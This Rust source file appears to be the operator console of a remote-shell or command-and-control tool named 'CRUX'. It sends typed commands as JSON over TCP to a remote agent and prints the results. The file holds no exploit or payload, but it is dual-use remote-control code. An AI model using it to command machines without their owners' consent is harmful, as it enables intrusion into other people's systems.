#[path = "../utils/mod.rs"]
mod utils;

// crates
use colored::Colorize;
use clap::error::Result;
use rustyline::error::ReadlineError;
use rustyline::DefaultEditor;

// std
use std::net::{TcpStream};

// my stuff
use utils::network::{write_length_prefix, read_length_prefix};
use utils::data::{Cmd, CmdType, CmdResult};
use utils::os::Metadata;


fn send_cmd(stream: &mut TcpStream, cmd_type: CmdType, args_str: String) -> Result<(),Box<dyn std::error::Error>>{
    let cmd = Cmd {
        cmd_type: cmd_type,
        args: args_str
    };
    let cmd_str = serde_json::to_string(&cmd)?;
    write_length_prefix(stream, cmd_str.as_bytes())?;
    return Ok(());
}

// Determine prompt symbol based on username
fn parse_prompt_symbol(username: &str) -> char {
    match username {
        "root" => return '#',
        _ => return '$'
    };
}

pub fn linux_shell(stream: &mut TcpStream, meta_str: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut status = 0;
    let metadata: Metadata = serde_json::from_str(&meta_str)?;
    let prompt_symbol = parse_prompt_symbol(&metadata.username);
    let peer_ip = stream.peer_addr()?;

    let mut rl = DefaultEditor::new()?;

    loop {
        let mut prompt = format!("{}|{}@{}|{}|{} ",
            "CRUX".yellow().bold(),
            metadata.username.blue().bold(),
            metadata.hostname.cyan().bold(),
            peer_ip.to_string().red().bold(),
            prompt_symbol);

        // Prepend status if it's not 0
        if status != 0 {
            prompt = format!("[{}]{}", status.to_string().red().bold(), prompt);
        }

        let readline = rl.readline(&prompt);

        match readline {
            Ok(input) => {
                if input.is_empty() {
                    continue;
                }
                // Record history
                let _ = rl.add_history_entry(input.as_str());

                // Handle input
                let input = input.trim();
                let mut parts = input.splitn(2, ' ');
                let cmd = match parts.next() {
                    Some(cmd) => cmd,
                    _none => continue,
                };
                let path = parts.next().unwrap_or(""); // For commands with single path argument
                                                       // (cd, download, upload, etc.)

                match cmd {
                    "exit" => {
                        send_cmd(stream, CmdType::Exit, "".to_string())?;
                    }
                    "cd" => {
                        send_cmd(stream, CmdType::Cd, path.to_string())?;
                    }
                    "download" => {
                        println!("File download feature under construction...");
                        continue;
                    }
                    "upload" => {
                        println!("File upload feature under construction...");
                        continue;
                    }
                    "clear" => { // Currently not working for some reason
                        print!("\x1B[2J");
                        continue;
                    }
                    _ => {
                        send_cmd(stream, CmdType::Exec, input.to_string())?;
                    }
                }
                // Receive and parse command output
                let received_output_raw = read_length_prefix(stream)?;
                let received_output: CmdResult = serde_json::from_slice(&received_output_raw)?;
                println!("{}", received_output.output);
                status = received_output.status;
            } // Ok(input)
            Err(ReadlineError::Interrupted) => {
                // TODO: Signal Agent to cancel execution
                continue;
            }
            Err(ReadlineError::Eof) => {
                break;
            }
            Err(err) => {
                eprintln!("Error: {:?}", err);
                break;
            }
        }
    }
    return Ok(())
}
